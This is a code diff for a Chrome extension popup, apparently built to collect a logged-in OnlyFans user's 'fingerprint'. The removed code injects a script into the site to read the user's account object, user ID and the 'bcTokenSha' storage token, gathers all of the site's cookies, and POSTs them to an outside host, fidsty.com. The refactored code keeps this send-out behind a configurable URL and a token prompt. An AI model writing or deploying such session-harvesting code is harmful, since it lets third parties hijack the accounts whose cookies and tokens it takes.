@@ -1,208 +1,113 @@
+import "../styles/main.css";
+
+import { getSubmitFPUrl, getNewTabUrlPatterns } from "./config";
+import {
+  collectFingerprint,
+  copyFingerprintToClipboard,
+  downloadFingerprint,
+  focusMatchingTab,
+} from "./fingerprint";
+import { showTokenModal } from "./token-modal";
+
+const DEFAULT_SUBMITTER_TEXT = "Get my fingerprint";
+const testModeInput = <HTMLInputElement | null>(
+  document.getElementById("test-mode")
+);
+
+const resetSubmitter = (
+  submitter: HTMLButtonElement,
+  text: string = DEFAULT_SUBMITTER_TEXT
+) => {
+  submitter.disabled = false;
+  submitter.textContent = text;
+};
+
 (async () => {
-    window.addEventListener('click', (e: PointerEvent) => {
-        window['shiftKeyStatus'] = e.shiftKey;
-        window['ctrlKeyStatus'] = e.ctrlKey;
-    });
+  window.addEventListener("click", (e: PointerEvent) => {
+    window["shiftKeyStatus"] = e.shiftKey;
+    window["ctrlKeyStatus"] = e.ctrlKey;
+  });
 
-    const form = <HTMLFormElement>document.querySelector('[id="getMyFingerprint"]');
+  const form = <HTMLFormElement | null>(
+    document.querySelector('[id="getMyFingerprint"]')
+  );
 
-    if (form) {
-        form.onsubmit = async (e: SubmitEvent | any) => {
-            e.preventDefault();
+  if (!form) return;
 
-            const { submitter } = e;
+  form.onsubmit = async (e: SubmitEvent | any) => {
+    e.preventDefault();
 
-            if (submitter) {
-                submitter.disabled = true;
+    const submitter = <HTMLButtonElement | null>e.submitter;
+    if (!submitter)
+      throw new Error("Something went wrong. Submitter not found.");
 
-                submitter.textContent = 'Checking your profile...';
+    submitter.disabled = true;
+    submitter.textContent = "Checking your profile...";
+    const fingerprint = await collectFingerprint();
 
-                const tabs = await chrome.tabs.query({
-                    currentWindow: true,
-                    url: [
-                        "*://onlyfans.com/*",
-                    ]
-                });
+    if (!fingerprint) {
+      resetSubmitter(submitter, "Could not retrieve fingerprint");
 
-                let tab = tabs.pop();
-
-                let isNewTab = false;
-
-                if (tab) { } else {
-                    tab = await chrome.tabs.create({
-                        active: true,
-                        url: 'https://onlyfans.com'
-                    });
-
-                    isNewTab = true;
-                }
-
-                const { id: tabId } = tab;
-
-                await new Promise<void>((resolve, reject) => {
-                    const observer = async () => {
-                        const tab = await chrome.tabs.get(tabId);
-
-                        const { status } = tab;
-
-                        if ('complete' == status) {
-                            resolve();
-
-                            return;
-                        }
-
-                        setTimeout(observer, 1000);
-                    };
-
-                    observer()
-                });
-
-                const executed = await chrome.scripting.executeScript({
-                    target: { tabId: tabId },
-                    world: "MAIN",
-                    func: async () => new Promise((resolve, reject) => {
-                        const observer = () => {
-                            const app: any = document.querySelector('[id="app"]');
-
-                            if (app) {
-                                const { __vue__: vue } = app;
-
-                                const { isAuth } = vue;
-
-                                if (isAuth) {
-                                    const { authUser } = vue;
-
-                                    const { id: userId } = authUser;
-
-                                    const { userAgent } = navigator;
-
-                                    const bcTokenSha = localStorage.getItem('bcTokenSha');
-
-                                    resolve({
-                                        authUser,
-                                        userAgent,
-                                        bcTokenSha,
-                                        userId
-                                    });
-
-                                    return;
-                                }
-                            }
-
-                            setTimeout(observer, 100);
-                        };
-
-                        observer();
-                    }),
-                });
-
-                const { result } = executed[0];
-
-                const cookies = await chrome.cookies.getAll({
-                    url: 'https://onlyfans.com'
-                });
-
-                const fingerprint = {
-                    cookies,
-                    ...result,
-                };
-
-                const str = JSON.stringify(fingerprint);
-
-                if (window['shiftKeyStatus']) {
-                    const result = await Notification.requestPermission();
-
-                    try {
-                        await navigator.clipboard.writeText(str);
-
-                        if ('granted' == result) {
-                            new Notification("Get My Fingerprint", { body: "Fingerprint copied to clipboard" });
-                        }
-                    } catch (error: any) {
-                        console.error(error.message);
-                    }
-                }
-
-                const downloadFingerprint = () => {
-                    const blob = new Blob([str], { type: "application/json" });
-
-                    const url = URL.createObjectURL(blob);
-
-                    const downloadLink = document.createElement("a");
-
-                    downloadLink.href = url;
-
-                    const { userId, authUser } = fingerprint;
-
-                    const { username } = authUser;
-
-                    downloadLink.download = `fingerprint_${userId}_${username}.json`;
-
-                    downloadLink.click();
-                };
-
-                if (window['ctrlKeyStatus']) downloadFingerprint();
-
-                if (isNewTab) chrome.tabs.remove(tabId);
-
-                const TOKEN = '';
-
-                const response = await fetch(`https://fidsty.com/infp?token=${TOKEN}`, {
-                    method: 'POST',
-                    headers: {
-                        contentType: 'applocation/json',
-                    },
-                    body: JSON.stringify(fingerprint),
-                });
-
-                const { ok, status } = response;
-
-                if (!ok) {
-                    submitter.disabled = false;
-
-                    submitter.textContent = 'Fingerprint not added';
-
-                    downloadFingerprint();
-
-                    return;
-                }
-
-                submitter.textContent = 'Fingerprint collected';
-
-                {
-                    const tabs = await chrome.tabs.query({
-                        url: [
-                            "*://fidsty.com/*",
-                            "*://*.fidsty.com/*"
-                        ]
-                    });
-
-                    const tab = tabs.pop();
-
-                    if (tab) {
-                        const { id: tabId } = tab;
-
-                        chrome.tabs.update(tabId, {
-                            active: true,
-                        });
-
-                        chrome.scripting.executeScript({
-                            target: { tabId: tabId },
-                            world: "MAIN",
-                            func: (fingerprint: any) => {
-                                // TODO: уведомить сайт о перехвате отпечатка
-                            },
-                            args: [fingerprint]
-                        });
-                    }
-                }
-
-                setTimeout(() => {
-                    window.close();
-                }, 100);
-            }
-
-            return true;
-        };
+      return;
     }
+
+    if (window["shiftKeyStatus"]) {
+      await copyFingerprintToClipboard(fingerprint);
+    }
+
+    if (window["ctrlKeyStatus"]) {
+      downloadFingerprint(fingerprint);
+    }
+
+    submitter.textContent = "Enter token to continue";
+
+    const token = await showTokenModal();
+
+    if (!token) {
+      resetSubmitter(submitter);
+
+      return;
+    }
+
+    const isTestMode = Boolean(testModeInput?.checked);
+
+    submitter.textContent = "Sending fingerprint...";
+
+    let response: Response;
+
+    try {
+      response = await fetch(getSubmitFPUrl(isTestMode, token), {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(fingerprint),
+      });
+    } catch (error: any) {
+      console.error(error.message);
+      resetSubmitter(submitter, "Fingerprint not added");
+      // downloadFingerprint();
+
+      return;
+    }
+
+    const { ok } = response;
+
+    if (!ok) {
+      resetSubmitter(submitter, "Fingerprint not added");
+      // downloadFingerprint();
+
+      return;
+    }
+
+    submitter.textContent = "Fingerprint collected";
+
+    await focusMatchingTab(getNewTabUrlPatterns(isTestMode), fingerprint);
+
+    setTimeout(() => {
+      window.close();
+    }, 100);
+
+    return;
+  };
 })();
